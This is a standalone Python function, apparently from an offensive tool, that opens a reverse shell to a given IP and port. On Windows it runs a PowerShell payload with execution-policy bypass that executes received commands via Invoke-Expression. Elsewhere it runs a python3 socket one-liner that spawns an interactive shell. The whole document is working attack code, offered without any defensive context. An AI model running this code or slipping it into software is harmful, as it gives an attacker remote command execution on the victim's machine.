def reverse_shell(ip, port):
    import os, platform
    ip = ip
    port = port
    if(platform.system() == "Windows"):
        rev_shell = '''powershell -nop -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'''' + str(ip) + '''\', ''' + str(port) + ''');$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'''
        os.system(rev_shell)
    else:
        rev_shell = """"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""" + str(ip) + """\",""" + str(port) + """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""
        os.system(rev_shell)
